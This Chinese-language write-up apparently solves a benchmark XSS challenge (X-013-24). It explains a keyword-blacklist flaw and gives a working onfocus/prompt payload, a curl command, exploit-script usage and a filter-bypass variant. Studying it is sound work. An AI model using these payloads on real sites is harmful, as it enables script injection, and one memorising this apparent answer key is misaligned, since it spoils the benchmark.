# X-013-24 利用说明（含一键脚本与命令）

## 漏洞原理（简述）
- 注入点：后端将 `name` 参数直接拼接到页面中输入框后方（先强制添加一个前导 `>`），从而使我们提交的新标签被当作 HTML 解析并执行事件处理器。
- 黑名单：仅拦截明文 `alert`、`confirm` 字样；`prompt` 未被屏蔽。
- 校验器：PhantomJS 监听 `alert/confirm/prompt` 的消息，只有当消息内容严格等于 `XSS` 时返回成功。页面中会主动对具有 `autofocus`/`onfocus` 的元素派发 focus 事件，便于触发我们注入的 `onfocus`。
- 关键点：使用 `prompt(/XSS/.source)`，其返回的消息内容为 `XSS`，满足校验要求且不触发黑名单。

## 直接利用命令（带目标 IP/端口）

```
curl "http://ip32777/page?name=%3Cinput%20autofocus%20onfocus%3Dprompt%28%2FXSS%2F.source%29%3E"
```

示例返回中可见 `Congratulations!` 且包含 flag，如：

```
<div class="solution-text"><img src="static/img/cookies/success_circle.png" alt="Correct" width="150" height="150"><br>Congratulations!<p> Here is the flag: FLAG{...}</div>
```

## 脚本用法（exp.py）

- 路径：`benchmarks/X-013-24/exp.py`
- 运行：

```
python3 benchmarks/X-013-24/exp.py
```

- 行为：对固定目标 `http://ip32777/page` 发送 `name=<payload>`，解析返回并直接打印 flag；未解析到 flag 时会打印完整响应内容以便排查。

## 请求细节

- 方法：GET
- 目标：`http://ip32777/page`
- 参数：
  - `name=<input autofocus onfocus=prompt(/XSS/.source)>`（URL 编码后如上述 curl 所示）

## 备注
- 若目标环境变动（端口/域名变化或策略调整），只需更新 `exp.py` 中的 `TARGET_URL` 或替换 payload（如需绕过更严格的关键字过滤，可改用 `window['al'+'ert'](/XSS/.source)` 等变体）。

